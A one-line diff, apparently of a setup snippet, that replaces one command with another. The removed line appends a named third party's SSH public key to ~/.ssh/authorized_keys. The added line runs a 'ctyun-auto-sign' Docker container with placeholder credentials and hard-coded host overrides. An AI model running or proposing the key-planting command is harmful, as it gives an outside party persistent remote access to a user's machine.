@@ -1,1 +1,1 @@
-mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0We1dVQoKm7ITDdSaq3gnbwRjEiS2R8Q0uwij4VdbA Administrator@XiaoGaoTaiShi' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo OK
+mkdir -p ~/data && sudo docker run -it --name ctyun_sign_ACCOUNT -e APP_USER="ACCOUNT" -e APP_PASSWORD="PASSWORD" -v "$HOME/data":/app/data --add-host deskcdn.ctyun.cn:106.120.187.154 --add-host deskcdn.ctyun.cn.ctadns.cn:106.120.187.154 --restart unless-stopped ctyun-auto-sign:v1
